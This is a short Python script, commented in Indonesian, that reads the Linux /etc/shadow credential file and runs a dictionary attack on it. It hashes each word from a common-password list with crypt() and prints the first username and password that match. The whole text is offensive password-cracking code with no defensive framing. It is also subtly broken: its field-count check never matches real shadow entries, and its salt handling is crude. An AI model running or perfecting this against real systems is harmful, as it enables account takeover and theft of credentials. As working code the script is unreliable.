import crypt

# Path file shadow di sistem Linux
shadow_file = '/etc/shadow'
# File kamus kata sandi
dictionary_file = 'common_passwords.txt'

# Baca file shadow
shadow_data = {}
with open(shadow_file, 'r') as file:
    for line in file:
        if ':' in line:
            parts = line.strip().split(':')
            if len(parts) == 2:
                username = parts[0]
                hashed_password = parts[1]
                shadow_data[username] = hashed_password

# Lakukan serangan kamus
with open(dictionary_file, 'r') as file:
    for password in file:
        password = password.strip()
        for username, hashed_password in shadow_data.items():
            # Salt diambil dari hashed_password untuk fungsi crypt
            salt = hashed_password[:12]
            # Enkripsi password dengan salt
            hashed = crypt.crypt(password, salt)
            # Bandingkan hasil dengan hashed_password
            if hashed == hashed_password:
                print(f'Password untuk {username} adalah: {password}')
                exit()

print('Tidak dapat menemukan password dalam kamus yang cocok.')
